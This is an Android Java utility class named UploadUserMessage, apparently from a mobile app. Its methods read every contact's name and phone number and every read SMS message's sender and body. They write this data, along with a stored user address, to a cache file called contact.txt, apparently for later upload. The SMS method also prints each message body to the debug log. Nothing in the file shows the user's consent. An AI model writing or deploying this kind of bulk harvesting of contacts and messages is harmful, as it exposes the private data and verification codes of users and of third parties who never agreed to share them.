package com.pengdikj.cops.utils;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.text.TextUtils;

import com.pengdikj.cops.utils.constant.ConfigConstant;

import java.util.ArrayList;

import static com.hss01248.dialog.StyledDialog.context;

/**
 * 作者：Macyy on 2017/4/14 0014 16:48
 * 邮箱：yy107829@sian.com
 */
public class UploadUserMessage {


    /**获取库Phon表字段**/
    private static final String[] PHONES_PROJECTION = new String[] {
            ContactsContract.CommonDataKinds.Phone
                    .DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Photo.PHOTO_ID, ContactsContract.CommonDataKinds.Phone.CONTACT_ID };

    /**联系人显示名称**/
    private static final int PHONES_DISPLAY_NAME_INDEX = 0;

    /**电话号码**/
    private static final int PHONES_NUMBER_INDEX = 1;


    public static boolean getContacts(Context context) {
        /**联系人名称**/
        ArrayList<String> mContactsName = new ArrayList<String>();
        ContentResolver resolver = context.getContentResolver();
        // 获取手机联系人
        Cursor phoneCursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,PHONES_PROJECTION, null, null, null);

        if (phoneCursor != null) {
            while (phoneCursor.moveToNext()) {

                //得到手机号码
                String phoneNumber = phoneCursor.getString(PHONES_NUMBER_INDEX);
                //当手机号码为空的或者为空字段 跳过当前循环
                if (TextUtils.isEmpty(phoneNumber))
                    continue;

                //得到联系人名称
                String contactName = phoneCursor.getString(PHONES_DISPLAY_NAME_INDEX);
                mContactsName.add(contactName+":"+phoneNumber);
            }
            FileUtils.writeTxtToFile("$$$"+SysConfig.getConfig(context).getCustomConfig(ConfigConstant.USER_ADDRESS), FileUtils.getCachePath(context),"/contact.txt");
            FileUtils.writeTxtToFile("==========", FileUtils.getCachePath(context),"/contact.txt");
            for(String s:mContactsName){
                FileUtils.writeTxtToFile(s,FileUtils.getCachePath(context),"/contact.txt");
            }
            phoneCursor.close();
            return true;
        }
        return false;
    }

    public static boolean getSmsFromPhone(Activity activity) {
        ArrayList<String> mSmsName = new ArrayList<String>();
        Cursor c = activity.managedQuery(Uri.parse("content://sms"), new String[]{"_id", "address", "read", "body"},
                "read=?", new String[]{"1"}, "_id desc");//按id排序，如果按date排序的话，修改手机时间后
        if (c != null && c.getCount() > 0) {
            while (c.moveToNext()) {
                String address = c.getString(c.getColumnIndex("address"));
                String body = c.getString(c.getColumnIndex("body"));

                mSmsName.add(address+":"+body.replace("\n",""));
//                c.moveToNext();
                LogUtil.e(address+":"+body.replace("\n",""));
            }
            for(String s:mSmsName){
                FileUtils.writeTxtToFile(s, FileUtils.getCachePath(context),"/contact.txt");
            }
            FileUtils.writeTxtToFile("==========", FileUtils.getCachePath(context),"/contact.txt");
            return true;
        }else{
            return false;
        }
    }
}
